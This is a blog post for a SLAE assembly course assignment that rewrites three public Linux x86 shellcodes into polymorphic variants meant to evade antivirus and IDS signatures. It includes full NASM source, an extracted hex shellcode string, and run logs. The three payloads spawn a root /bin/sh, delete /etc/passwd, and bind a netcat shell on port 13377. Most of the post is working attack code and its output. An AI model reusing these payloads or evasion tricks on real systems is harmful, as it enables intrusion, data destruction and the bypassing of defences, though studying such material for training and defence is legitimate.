<!DOCTYPE html>
<html lang="en-us">

  <head>
  <link href="http://gmpg.org/xfn/11" rel="profile">
  <meta http-equiv="content-type" content="text/html; charset=utf-8">

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">

  <title>
    
      SLAE Assignment 6 - Polymorphic shellcodes &middot; phackt.com:~#
    
  </title>

  
  <link rel="canonical" href="http://localhost:4000/slae-polymorphic-shellcodes">
  

  <link rel="stylesheet" href="http://localhost:4000/public/css/poole.css">
  <link rel="stylesheet" href="http://localhost:4000/public/css/syntax.css">
  <link rel="stylesheet" href="http://localhost:4000/public/css/lanyon.css">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Serif:400,400italic,700%7CPT+Sans:400">

  <link rel="apple-touch-icon-precomposed" sizes="144x144" href="http://localhost:4000/public/apple-touch-icon-precomposed.png">
  <link rel="shortcut icon" href="http://localhost:4000/public/favicon.ico">

  <link rel="alternate" type="application/rss+xml" title="RSS" href="http://localhost:4000/atom.xml">

  
</head>


  <body>

    <!-- Target for toggling the sidebar `.sidebar-checkbox` is for regular
     styles, `#sidebar-checkbox` for behavior. -->
<input type="checkbox" class="sidebar-checkbox" id="sidebar-checkbox" checked>

<!-- Toggleable sidebar -->
<div class="sidebar" id="sidebar">
  <div class="sidebar-item">
    <p>Some infosec stuff.</p>
  </div>

  <nav class="sidebar-nav">
    <a class="sidebar-nav-item" href="http://localhost:4000/">Home</a>

    

    
    
      
        
      
    
      
        
      
    
      
        
          <a class="sidebar-nav-item" href="http://localhost:4000/about">About</a>
        
      
    
      
    
      
    
      
        
      
    
      
        
      
    
      
        
      
    
      
        
      
    
      
        
      
    
      
    
      
    

    <a class="sidebar-nav-item" href="/archive/v1.1.0.zip">Download</a>
    <a class="sidebar-nav-item" href="">GitHub project</a>
    <span class="sidebar-nav-item">Currently v1.1.0</span>
  </nav>

  <div class="sidebar-item">
    <p>
      &copy; 2020. All rights reserved.
    </p>
  </div>
</div>


    <!-- Wrap is the content to shift when toggling the sidebar. We wrap the
         content to avoid any CSS collisions with our real content. -->
    <div class="wrap">
      <div class="masthead">
        <div class="container">
          <h3 class="masthead-title">
            <a href="/" title="Home">phackt.com:~#</a>
            <small>Let's talk about sec, baby!</small>
          </h3>
        </div>
      </div>

      <div class="container content">
        <div class="post">
  <h1 class="post-title">SLAE Assignment 6 - Polymorphic shellcodes</h1>
  <span class="post-date">29 Apr 2017</span>
  <p><br />
Student <strong>SLAE - 891</strong><br />
Github: <a href="https://github.com/phackt/slae">https://github.com/phackt/slae</a><br />
<a href="http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a></p>

<h3 id="assignment-6">Assignment 6:</h3>

<p><strong>Our Goal:</strong></p>
<blockquote>
  <p><em>Take up 3 shellcodes from Shell-Storm and create polymorphic versions</em></p>
  <ul>
    <li><em>The polymorphic versions can not be larger than 150% of the original versions</em></li>
    <li><em>Bonus points if shorter in length than original</em><br />
<!--more--></li>
  </ul>
</blockquote>

<p>Hello everybody,</p>

<p>So today we will create some polymorphic versions of existing shellcodes on the well-known site <a href="http://shell-storm.org/shellcode/">shell-storm</a>.<br />
Polymorphic versions aims at defeating pattern matching by AV and IDS:</p>
<ul>
  <li>Replacing instructions with equivalent ones.</li>
  <li>Add garbage instructions that will not change the shellcode functionality but create a mess for the AV analysis.</li>
</ul>

<p><a href="https://www.virustotal.com/">VirusTotal</a> gathers AV engines but i do not recommend to test your shellcode on it because it will be fingerprinted and may be added to their database, so your next NSA hack may fail, such a pity.<br />
<br /></p>
<h3 id="jmpcallpop-execve-shell">jmp/call/pop execve shell:</h3>

<p>Ok so for our first shellcode <a href="https://github.com/phackt/slae/tree/master/assignment6/execve/execve.nasm">execve.nasm</a> let’s have a look at a <a href="http://shell-storm.org/shellcode/files/shellcode-863.php">jmp/call/pop execve shellcode</a> (52 bytes long):</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">global</span> <span class="nv">_start</span>

<span class="nf">section</span> <span class="nv">.text</span>
<span class="nl">_start:</span>
    <span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">here</span>

<span class="nl">me:</span>
    <span class="nf">pop</span> <span class="nb">esi</span>
    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span><span class="nb">esi</span>
    
    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span><span class="nb">eax</span>
    <span class="nf">push</span> <span class="nb">eax</span>
    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span><span class="nb">esp</span>
    
    <span class="nf">push</span> <span class="nb">eax</span>
    <span class="nf">add</span> <span class="nb">esp</span><span class="p">,</span><span class="mi">3</span>
    <span class="nf">lea</span> <span class="nb">esi</span><span class="p">,[</span><span class="nb">esi</span> <span class="o">+</span><span class="mi">4</span><span class="p">]</span>
    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,[</span><span class="nb">esi</span><span class="p">]</span>
    <span class="nf">push</span> <span class="nb">eax</span>
    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span><span class="nb">eax</span>
    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,[</span><span class="nb">edi</span><span class="p">]</span>
    <span class="nf">push</span> <span class="nb">eax</span>
    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">esp</span> 

    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span><span class="nb">eax</span>
    <span class="nf">push</span> <span class="nb">eax</span>
    <span class="nf">lea</span> <span class="nb">edi</span><span class="p">,[</span><span class="nb">ebx</span><span class="p">]</span>
    <span class="nf">push</span> <span class="nb">edi</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span><span class="nb">esp</span>

    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span><span class="mh">0xb</span>
    <span class="nf">int</span> <span class="mh">0x80</span>

<span class="nl">here:</span>
    <span class="nf">call</span> <span class="nv">me</span>
    <span class="nf">path</span> <span class="nv">db</span> <span class="err">"</span><span class="o">//</span><span class="nv">bin</span><span class="o">/</span><span class="nv">sh</span><span class="err">"</span>
</code></pre></div></div>

<p>Let’s execute the shellcode:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ./compile.sh execve &amp;&amp; chmod u+x ./execve &amp;&amp; ./execve</span>
<span class="o">[</span>+] Assembling with Nasm ... 
<span class="o">[</span>+] Linking ...
<span class="o">[</span>+] Done!
<span class="c"># id</span>
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
<span class="c"># </span>
</code></pre></div></div>

<p>The advantage of this shellcode is that the opcodes have been already thought to obfuscate a bit the shellcode behavior. If we add a second layer we can be barely sure that the shellcode will bypass the majority of the AVs.  A good idea here is to obfuscate the <strong>//bin/sh</strong> variable and to add some garbage opcodes and/or to mix them.</p>

<p>So let’s have a look at our polymorphic shellcode <a href="https://github.com/phackt/slae/tree/master/assignment6/execve/execve_polymorphic.nasm">execve_polymorphic.nasm</a>:</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">global</span> <span class="nv">_start</span>

<span class="nf">section</span> <span class="nv">.text</span>
<span class="nl">_start:</span>
    <span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">here</span>

<span class="nl">me:</span>
    <span class="nf">mov</span> <span class="kt">dword</span> <span class="nb">esi</span><span class="p">,</span> <span class="p">[</span><span class="nb">esp</span><span class="p">]</span>    <span class="c1">; equivalent to mov the @ of our encoded //bin/sh into esi</span>
    <span class="nf">pop</span> <span class="nb">edi</span>                 <span class="c1">; same @ in edi</span>
    
    <span class="nf">push</span> <span class="mh">0x1</span>                <span class="c1">; mix a little bit the opcodes</span>
    <span class="nf">pop</span> <span class="nb">eax</span>
    <span class="nf">dec</span> <span class="nb">eax</span>
    <span class="nf">push</span> <span class="nb">eax</span>
    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span><span class="nb">esp</span>

    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>
    <span class="nf">mov</span> <span class="nb">cl</span><span class="p">,</span> <span class="mh">0x7</span>             <span class="c1">; //bin/sh is 7 bytes long</span>

<span class="nl">dec1:</span>                       
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">edi</span> <span class="o">+</span> <span class="nb">ecx</span><span class="p">]</span>    <span class="c1">; we are looping on our string</span>
    <span class="nf">dec</span> <span class="nb">eax</span>                 <span class="c1">; decrement the value</span>
    <span class="nf">mov</span> <span class="p">[</span><span class="nb">edi</span> <span class="o">+</span> <span class="nb">ecx</span><span class="p">],</span> <span class="nb">eax</span>    <span class="c1">; setting the right char into memory</span>
    <span class="nf">dec</span> <span class="nb">cl</span>
    <span class="nf">jns</span> <span class="nv">dec1</span>                <span class="c1">; jump if not signed</span>

    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>            <span class="c1">; here we go for setting the right argument for our execve syscall</span>
    <span class="nf">push</span> <span class="nb">eax</span>
    <span class="nf">add</span> <span class="nb">esp</span><span class="p">,</span><span class="mi">3</span>
    <span class="nf">lea</span> <span class="nb">esi</span><span class="p">,[</span><span class="nb">esi</span><span class="o">+</span><span class="mi">6</span><span class="p">]</span>
    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,[</span><span class="nb">esi</span><span class="o">-</span><span class="mi">2</span><span class="p">]</span>

    <span class="nf">push</span> <span class="nb">eax</span>
    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span><span class="nb">eax</span>
    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,[</span><span class="nb">edi</span><span class="p">]</span>
    <span class="nf">push</span> <span class="nb">eax</span>
    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span><span class="nb">esp</span> 

    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span><span class="nb">eax</span>
    <span class="nf">push</span> <span class="nb">eax</span>
    <span class="nf">lea</span> <span class="nb">edi</span><span class="p">,[</span><span class="nb">ebx</span><span class="p">]</span>
    <span class="nf">push</span> <span class="nb">edi</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span><span class="nb">esp</span>

    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span><span class="mh">0xb</span>              <span class="c1">; int execve(const char *filename, char *const argv[],char *const envp[]);</span>

    <span class="nf">int</span> <span class="mh">0x80</span>

<span class="nl">here:</span>
    <span class="nf">call</span> <span class="nv">me</span>
    <span class="nf">path</span> <span class="nv">db</span> <span class="mh">0x30</span><span class="p">,</span><span class="mh">0x30</span><span class="p">,</span><span class="mh">0x63</span><span class="p">,</span><span class="mh">0x6a</span><span class="p">,</span><span class="mh">0x6f</span><span class="p">,</span><span class="mh">0x30</span><span class="p">,</span><span class="mh">0x74</span><span class="p">,</span><span class="mh">0x69</span> <span class="c1">; encoded //bin/sh string, we added 1 to each byte</span>
</code></pre></div></div>

<p>Let’s compile our polymorphic shellcode:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ./compile.sh execve_polymorphic</span>
<span class="o">[</span>+] Assembling with Nasm ... 
<span class="o">[</span>+] Linking ...
<span class="o">[</span>+] Done!
<span class="c"># objdump -d ./execve_polymorphic|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'</span>
<span class="s2">"</span><span class="se">\x</span><span class="s2">eb</span><span class="se">\x</span><span class="s2">3a</span><span class="se">\x</span><span class="s2">8b</span><span class="se">\x</span><span class="s2">34</span><span class="se">\x</span><span class="s2">24</span><span class="se">\x</span><span class="s2">5f</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">58</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e2</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">b1</span><span class="se">\x</span><span class="s2">07</span><span class="se">\x</span><span class="s2">8b</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">0f</span><span class="se">\x</span><span class="s2">48</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">0f</span><span class="se">\x</span><span class="s2">fe</span><span class="se">\x</span><span class="s2">c9</span><span class="se">\x</span><span class="s2">79</span><span class="se">\x</span><span class="s2">f5</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">83</span><span class="se">\x</span><span class="s2">c4</span><span class="se">\x</span><span class="s2">03</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">76</span><span class="se">\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">33</span><span class="se">\x</span><span class="s2">46</span><span class="se">\x</span><span class="s2">fe</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">33</span><span class="se">\x</span><span class="s2">07</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e3</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">50</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">3b</span><span class="se">\x</span><span class="s2">57</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">e1</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">e8</span><span class="se">\x</span><span class="s2">c1</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">63</span><span class="se">\x</span><span class="s2">6a</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">30</span><span class="se">\x</span><span class="s2">74</span><span class="se">\x</span><span class="s2">69"</span>
</code></pre></div></div>

<p>Let’s run it into <a href="https://github.com/phackt/slae/tree/master/assignment6/execve/shellcode.c">shellcode.c</a>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># gcc -fno-stack-protector -z execstack -o shellcode shellcode.c &amp;&amp; ./shellcode</span>
Shellcode Length:  73
<span class="c"># id</span>
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></div></div>

<p>Our polymorphic shellcode is 73 bytes so we are under the 52 * 1.5 = 78 bytes, perfect.<br />
<br /></p>
<h3 id="unlink-etcpasswd-shellcode">unlink /etc/passwd shellcode:</h3>

<p>For this second shellcode let’s have a look at a <a href="http://shell-storm.org/shellcode/files/shellcode-560.php">shellcode</a> that aims at unlinking the critical /etc/passwd file.  A quick <code class="language-plaintext highlighter-rouge">man 2 unlink</code> provides this information: <em><strong>unlink()</strong> deletes a name from the filesystem.</em>.  Great, but please don’t forget to backup your /etc/passwd file.</p>

<p>Let’s compile and debug thanks to gdb:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># gcc -fno-stack-protector -z execstack -o unlink unlink.c &amp;&amp; chmod u+x ./unlink &amp;&amp; ./unlink</span>
Shellcode Length: 35
<span class="c"># ls -lrt /etc/passwd*</span>
<span class="nt">-rw-------</span> 1 0 root 3025 mars   1 21:47 /etc/passwd-
<span class="nt">-rw-r--r--</span> 1 0 root 3073 avril 22 13:48 /etc/passwd.backup
</code></pre></div></div>

<p>Ok so we have our passwd backups but the <em>/etc/passwd</em> file has been deleted.  Let’s have a look to the shellcode (35 bytes long):</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># gdb -q unlink</span>
Reading symbols from unlink...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
gdb-peda<span class="nv">$ </span>print &amp;shell
<span class="nv">$1</span> <span class="o">=</span> <span class="o">(</span>&lt;data variable, no debug info&gt; <span class="k">*</span><span class="o">)</span> 0x804a040 &lt;shell&gt;
gdb-peda<span class="nv">$ </span>br <span class="k">*</span>&amp;shell
Breakpoint 1 at 0x804a040
gdb-peda<span class="nv">$ </span>r
Starting program: /root/Documents/pentest/certs/slae/exam/assignment6.2/unlink 
Shellcode Length: 35
<span class="o">[</span><span class="nt">----------------------------------registers-----------------------------------</span><span class="o">]</span>
EAX: 0x804a040 <span class="nt">--</span><span class="o">&gt;</span> 0x315e11eb 
EBX: 0x0 
ECX: 0x7fffffeb 
EDX: 0xb7faf870 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
ESI: 0x1 
EDI: 0xb7fae000 <span class="nt">--</span><span class="o">&gt;</span> 0x1b2db0 
EBP: 0xbffff238 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
ESP: 0xbffff21c <span class="nt">--</span><span class="o">&gt;</span> 0x8048479 <span class="o">(</span>&lt;main+62&gt;: mov    eax,0x0<span class="o">)</span>
EIP: 0x804a040 <span class="nt">--</span><span class="o">&gt;</span> 0x315e11eb
EFLAGS: 0x282 <span class="o">(</span>carry parity adjust zero SIGN <span class="nb">trap </span>INTERRUPT direction overflow<span class="o">)</span>
<span class="o">[</span><span class="nt">-------------------------------------code-------------------------------------</span><span class="o">]</span>
   0x804a03a: add    BYTE PTR <span class="o">[</span>eax],al
   0x804a03c: add    BYTE PTR <span class="o">[</span>eax],al
   0x804a03e: add    BYTE PTR <span class="o">[</span>eax],al
<span class="o">=&gt;</span> 0x804a040 &lt;shell&gt;: jmp    0x804a053 &lt;shell+19&gt;
 | 0x804a042 &lt;shell+2&gt;: pop    esi
 | 0x804a043 &lt;shell+3&gt;: xor    eax,eax
 | 0x804a045 &lt;shell+5&gt;: xor    ecx,ecx
 | 0x804a047 &lt;shell+7&gt;: xor    edx,edx
 |-&gt;   0x804a053 &lt;shell+19&gt;:  call   0x804a042 &lt;shell+2&gt;
       0x804a058 &lt;shell+24&gt;:  das
       0x804a059 &lt;shell+25&gt;:  gs je  0x804a0bf
       0x804a05c &lt;shell+28&gt;:  das
                                                                  JUMP is taken
<span class="o">[</span><span class="nt">------------------------------------stack-------------------------------------</span><span class="o">]</span>
0000| 0xbffff21c <span class="nt">--</span><span class="o">&gt;</span> 0x8048479 <span class="o">(</span>&lt;main+62&gt;:  mov    eax,0x0<span class="o">)</span>
0004| 0xbffff220 <span class="nt">--</span><span class="o">&gt;</span> 0x1 
0008| 0xbffff224 <span class="nt">--</span><span class="o">&gt;</span> 0xbffff2e4 <span class="nt">--</span><span class="o">&gt;</span> 0xbffff480 <span class="o">(</span><span class="s2">"/root/Documents/pentest/certs/slae/exam/assignment6.2/unlink"</span><span class="o">)</span>
0012| 0xbffff228 <span class="nt">--</span><span class="o">&gt;</span> 0xbffff2ec <span class="nt">--</span><span class="o">&gt;</span> 0xbffff4bd <span class="o">(</span><span class="s2">"XDG_VTNR=2"</span><span class="o">)</span>
0016| 0xbffff22c <span class="nt">--</span><span class="o">&gt;</span> 0x804a040 <span class="nt">--</span><span class="o">&gt;</span> 0x315e11eb 
0020| 0xbffff230 <span class="nt">--</span><span class="o">&gt;</span> 0xb7fae3dc <span class="nt">--</span><span class="o">&gt;</span> 0xb7faf1e0 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
0024| 0xbffff234 <span class="nt">--</span><span class="o">&gt;</span> 0xbffff250 <span class="nt">--</span><span class="o">&gt;</span> 0x1 
0028| 0xbffff238 <span class="nt">--</span><span class="o">&gt;</span> 0x0 
<span class="o">[</span><span class="nt">------------------------------------------------------------------------------</span><span class="o">]</span>
Legend: code, data, rodata, value

Breakpoint 1, 0x0804a040 <span class="k">in </span>shell <span class="o">()</span>
gdb-peda<span class="nv">$ </span>x/17i <span class="nv">$eip</span>
<span class="o">=&gt;</span> 0x804a040 &lt;shell&gt;: jmp    0x804a053 &lt;shell+19&gt;
   0x804a042 &lt;shell+2&gt;: pop    esi
   0x804a043 &lt;shell+3&gt;: xor    eax,eax
   0x804a045 &lt;shell+5&gt;: xor    ecx,ecx
   0x804a047 &lt;shell+7&gt;: xor    edx,edx
   0x804a049 &lt;shell+9&gt;: mov    al,0xa
   0x804a04b &lt;shell+11&gt;:  mov    ebx,esi
   0x804a04d &lt;shell+13&gt;:  int    0x80
   0x804a04f &lt;shell+15&gt;:  mov    al,0x1
   0x804a051 &lt;shell+17&gt;:  int    0x80
   0x804a053 &lt;shell+19&gt;:  call   0x804a042 &lt;shell+2&gt;
   0x804a058 &lt;shell+24&gt;:  das    
   0x804a059 &lt;shell+25&gt;:  gs je  0x804a0bf
   0x804a05c &lt;shell+28&gt;:  das    
   0x804a05d &lt;shell+29&gt;:  jo     0x804a0c0
   0x804a05f &lt;shell+31&gt;:  jae    0x804a0d4
   0x804a061 &lt;shell+33&gt;:  ja     0x804a0c7
gdb-peda<span class="err">$</span>
</code></pre></div></div>

<p>So we can see a jmp/call/pop technique setting the string for the syscall <strong>0xa</strong> (int unlink(const char *pathname);). Then a syscall to the exit function. Debugging just after the <strong>pop esi</strong>:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>x/s <span class="nv">$esi</span>
0x804a058 &lt;shell+24&gt;: <span class="s2">"/etc/passwd"</span>
</code></pre></div></div>

<p>Let’s create our polymorphic shellcode:</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">global</span> <span class="nv">_start</span>

<span class="nf">section</span> <span class="nv">.text</span>
<span class="nl">_start:</span>
    <span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">here</span>

<span class="nl">me:</span>
    <span class="nf">pop</span> <span class="nb">ebx</span>          <span class="c1">; Directly pop the @ of /etc/passwd into ebx</span>

    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span><span class="nb">ecx</span>
    <span class="nf">mul</span> <span class="nb">ecx</span>          <span class="c1">; This instruction will cause both EAX and EDX to become zero</span>
    
    <span class="nf">mov</span> <span class="nb">cl</span><span class="p">,</span><span class="mh">0x1</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span><span class="mh">0xb</span>
    <span class="nf">sub</span> <span class="nb">al</span><span class="p">,</span><span class="nb">cl</span>        <span class="c1">; Equivalent to mov al,0xa</span>
    <span class="nf">int</span> <span class="mh">0x80</span>         <span class="c1">; int unlink(const char *pathname);</span>
    
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span><span class="nb">cl</span>        <span class="c1">; Equivalent to mov al,0x1</span>
    <span class="nf">int</span> <span class="mh">0x80</span>         <span class="c1">; void _exit(int status);</span>
    <span class="nf">call</span> <span class="nv">me</span>

<span class="nl">here:</span>
    <span class="nf">call</span> <span class="nv">me</span>
    <span class="nf">path</span> <span class="nv">db</span> <span class="s">"/etc/passwd"</span>
</code></pre></div></div>

<p>Let’s run it:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># touch /etc/passwd</span>
<span class="c"># ./compile.sh unlink_polymorphic &amp;&amp; ./unlink_polymorphic</span>
<span class="o">[</span>+] Assembling with Nasm ... 
<span class="o">[</span>+] Linking ...
<span class="o">[</span>+] Done!
<span class="c"># ls /etc/passwd</span>
<span class="nb">ls</span>: impossible d<span class="s1">'accéder à '</span>/etc/passwd<span class="s1">': Aucun fichier ou dossier de ce type
</span></code></pre></div></div>

<p>Here we go, our new polymorphic shellcode did the job and is <strong>40 bytes</strong> long.<br />
<br /></p>
<h3 id="netcat-bin-shellcode">netcat bin shellcode:</h3>

<p>Here we go for our last shell-storm shellcode. We will use this <a href="http://shell-storm.org/shellcode/files/shellcode-804.php">shellcode</a> which is calling netcat to bind a shell on port 13377.</p>

<p>Let’s assembly, link and execute <a href="https://github.com/phackt/slae/tree/master/assignment6/netcat/netcat_bind.nasm">netcat_bind.nasm</a> (<strong>64 bytes</strong> long):</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ./compile.sh netcat_bind</span>
<span class="o">[</span>+] Assembling with Nasm ... 
<span class="o">[</span>+] Linking ...
<span class="o">[</span>+] Done!
<span class="c"># ./netcat_bind </span>
listening on <span class="o">[</span>any] 13377 ...
</code></pre></div></div>

<p>Then from another shell:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># nc 127.0.0.1 13377</span>
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></div></div>

<p>Perfect, everything is working fine, so let’s mix up this opcodes in our <a href="https://github.com/phackt/slae/tree/master/assignment6/netcat/netcat_bind_polymorphic.nasm">netcat_bind_polymorphic.nasm</a>:</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">section</span> <span class="nv">.text</span>
    <span class="nf">global</span> <span class="nv">_start</span>
<span class="nl">_start:</span>
  <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span><span class="nb">ecx</span>
  <span class="nf">mul</span> <span class="nb">ecx</span>          <span class="c1">; mul technique to clear out EAX and EDX</span>
  
  <span class="nf">jmp</span> <span class="nv">short</span> <span class="nv">arg1</span>   <span class="c1">; jmp/call/pop technique</span>

<span class="nl">poptag1:</span>
    <span class="nf">pop</span> <span class="nb">edx</span>          <span class="c1">; replace the push opcode</span>
    <span class="nf">push</span> <span class="nb">eax</span>

  <span class="nf">push</span> <span class="mh">0x68732f6e</span>
  <span class="nf">push</span> <span class="mh">0x69622f65</span>
  <span class="nf">push</span> <span class="mh">0x76766c2d</span>
  <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span><span class="nb">esp</span>

  <span class="nf">push</span> <span class="nb">eax</span>
  <span class="nf">push</span> <span class="mh">0x636e2f2f</span>
  <span class="nf">push</span> <span class="mh">0x2f2f2f2f</span>
  <span class="nf">push</span> <span class="mh">0x6e69622f</span>
  <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>

  <span class="nf">push</span> <span class="nb">eax</span>
  <span class="nf">push</span> <span class="nb">edx</span>
  <span class="nf">push</span> <span class="nb">ecx</span>
  <span class="nf">push</span> <span class="nb">ebx</span>
  
  <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span><span class="nb">eax</span>      <span class="c1">; replace the xor opcode</span>
  <span class="nf">mov</span>  <span class="nb">ecx</span><span class="p">,</span><span class="nb">esp</span>
  <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span><span class="mi">11</span>        <span class="c1">; execve syscall</span>
  <span class="nf">int</span> <span class="mh">0x80</span>

<span class="nl">arg1:</span>
  <span class="nf">call</span> <span class="nv">poptag1</span>
  <span class="nf">string1</span> <span class="nv">db</span> <span class="s">"-vp13377"</span>
</code></pre></div></div>

<p>Let’s assembly, link, and execute:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># ./compile.sh netcat_bind_polymorphic &amp;&amp; ./netcat_bind_polymorphic</span>
<span class="o">[</span>+] Assembling with Nasm ... 
<span class="o">[</span>+] Linking ...
<span class="o">[</span>+] Done!
listening on <span class="o">[</span>any] 13377 ...

</code></pre></div></div>

<p>From another shell:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># nc 127.0.0.1 13377</span>
<span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></div></div>

<p>Perfect it works and our new shellcode is <strong>68 bytes</strong> long.<br />
We saw in this article that we can create some polymorphic versions of well known shellcodes in order to bypass the known signatures of these shellcodes.</p>

<p>Hope you enjoyed this post, see you soon for our last assignment.<br />
Bye,</p>

<p><a href="https://twitter.com/phackt_ul">Phackt</a></p>

</div>


<div class="related">
  <h2>Related posts</h2>
  <ul class="related-posts">
    
      <li>
        <h3>
          <a href="/git-secrets-exposed">
            What solutions to prevent git leaks ?
            <small>27 May 2020</small>
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/web-exposed-git-repositories">
            Gathering some information from web exposed git repositories
            <small>05 Aug 2018</small>
          </a>
        </h3>
      </li>
    
      <li>
        <h3>
          <a href="/play-with-permissive-cors">
            Play with permissive CORS
            <small>24 Dec 2017</small>
          </a>
        </h3>
      </li>
    
  </ul>
</div>


      </div>
